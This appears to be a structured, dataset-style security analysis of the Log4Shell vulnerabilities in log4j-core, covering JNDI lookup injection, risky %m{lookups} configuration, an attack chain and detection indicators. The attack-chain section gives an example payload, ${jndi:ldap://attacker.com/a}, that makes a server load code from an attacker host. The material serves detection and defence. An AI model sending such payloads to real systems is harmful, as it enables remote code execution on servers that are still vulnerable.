package_info.why_malicious: These versions of log4j-core contain critical vulnerabilities (CVE-2021-44228, CVE-2021-45046, CVE-2021-44832) that allow attackers to inject malicious JNDI lookup patterns into log messages. When exploited, this results in arbitrary code execution via remote class loading, effectively enabling remote attackers to compromise affected systems. While the vulnerability is not due to intentionally malicious code, its impact is equivalent to a supply chain compromise, as attackers can exploit the package to execute arbitrary code remotely.

execution_context.file_location: Any Java source file using Log4j logging methods (e.g., Logger.info, Logger.error, Logger.printf)

malicious_snippets.code_behavior: At runtime, when user-controlled input containing this pattern is logged, Log4j interprets the ${jndi:...} expression, initiates a JNDI lookup to the specified LDAP server, retrieves a remote Java class, and executes it, resulting in arbitrary code execution within the application process.

malice_analysis.why_suspicious: This pattern causes the application to initiate a network connection to an attacker-controlled LDAP server and load/execute remote code, which is a classic remote code execution vector and not expected in normal logging operations.
malice_analysis.violated_expectations: Normal logging should treat log message content as inert data and must never trigger network requests or code execution based on log message content. Here, user input in logs directly leads to code execution.
malice_analysis.similar_legitimate_use: JNDI lookups are sometimes used for legitimate resource resolution in enterprise Java applications, but never based on untrusted or user-supplied log message content.
key_indicators: Presence of ${jndi:...} patterns in log messages
LDAP/S or RMI network lookups triggered by log content
Execution of code fetched from remote servers via JNDI

malicious_snippets.code_behavior: At runtime, when PatternLayout is configured with %m{lookups}, Log4j enables message lookups in log messages, allowing attacker-controlled input to be interpreted as lookup expressions, which can trigger JNDI lookups and result in remote code execution.

malice_analysis.why_suspicious: Enabling lookups in log message patterns allows untrusted input to be interpreted as code or resource locators, which is highly dangerous and exposes the application to remote code execution attacks.
malice_analysis.violated_expectations: Logging configuration should not allow user input to trigger code execution or network access. Log message formatting should treat input as plain text.
malice_analysis.similar_legitimate_use: Lookups can be used for dynamic log enrichment in trusted, internal environments, but not with untrusted or user-supplied input.
key_indicators: PatternLayout with %m{lookups} in log4j configuration files
Lookups enabled in log message formatting

execution_context.file_location: Any Java source file using Logger.printf or similar methods

malicious_snippets.code_behavior: At runtime, if userInput contains a JNDI lookup pattern, Log4j processes the input, interprets the lookup expression, initiates a JNDI request to a remote server, and may execute code retrieved from that server, resulting in arbitrary code execution.

malice_analysis.why_suspicious: Logging user-controlled input without sanitization allows attackers to inject malicious lookup patterns, which Log4j will process and potentially execute, leading to remote code execution.
malice_analysis.violated_expectations: Logging should treat input as data, not as code or resource locators. User input should never be interpreted as executable expressions.
malice_analysis.similar_legitimate_use: Logging user input is common, but only when lookups are disabled or input is sanitized to prevent interpretation as lookup expressions.
key_indicators: Use of Logger.printf or similar methods with user-controlled variables

execution_context.trigger: runtime (when JndiLookup class is present on classpath)

malicious_snippets.code_snippet: JndiLookup.class (enables JNDI lookups in log messages)
malicious_snippets.code_behavior: At runtime, the presence of JndiLookup.class on the classpath allows Log4j to process JNDI lookups in log messages, enabling the attack vector by interpreting lookup expressions and initiating network requests for remote code loading.

malice_analysis.why_suspicious: The JndiLookup class enables the dangerous lookup mechanism that is exploited in this vulnerability, allowing log message content to trigger network requests and code execution.
malice_analysis.violated_expectations: Normal logging libraries should not allow arbitrary code execution or network access via log message content. The presence of this class enables such behavior by default.
malice_analysis.similar_legitimate_use: JndiLookup is used for legitimate resource resolution in trusted, internal environments, but its presence is dangerous when exposed to untrusted input.
key_indicators: JNDI lookups enabled by default in affected versions

attack_chain.action: Attacker sends a crafted log message containing a JNDI lookup pattern (e.g., ${jndi:ldap://attacker.com/a}) to the vulnerable application.
attack_chain.leads_to: Log4j processes the log message and triggers a JNDI lookup.

attack_chain.action: Log4j, with lookups enabled (via %m{lookups} or default settings), interprets the pattern and initiates a JNDI request to the attacker-controlled server.
attack_chain.leads_to: Application connects to the attacker's LDAP server.

attack_chain.action: The attacker’s LDAP server responds with a reference to a remote Java class file, which Log4j loads and executes.
attack_chain.leads_to: Arbitrary code execution in the context of the vulnerable application.

behavioral_signatures: Unexpected outbound LDAP/S or RMI network connections from application servers
PatternLayout with %m{lookups} in log4j configuration files
file_indicators: log4j2.xml or log4j2.properties with PatternLayout using %m{lookups}
network_indicators: Outbound LDAP/S or RMI connections to untrusted or external hosts
Connections to attacker-controlled domains or IPs specified in JNDI patterns
detection_knowledge.how_to_detect: Monitor application logs for suspicious ${jndi:...} patterns, audit log4j configuration files for PatternLayout with %m{lookups}, and scan for the presence of org/apache/logging/log4j/core/lookup/JndiLookup.class in deployed log4j-core JARs. Monitor network traffic for unexpected outbound LDAP/S or RMI connections, especially to external or untrusted hosts. Use runtime instrumentation or WAF rules to block or alert on JNDI lookup patterns in user input. Regularly review application dependencies for vulnerable log4j-core versions.
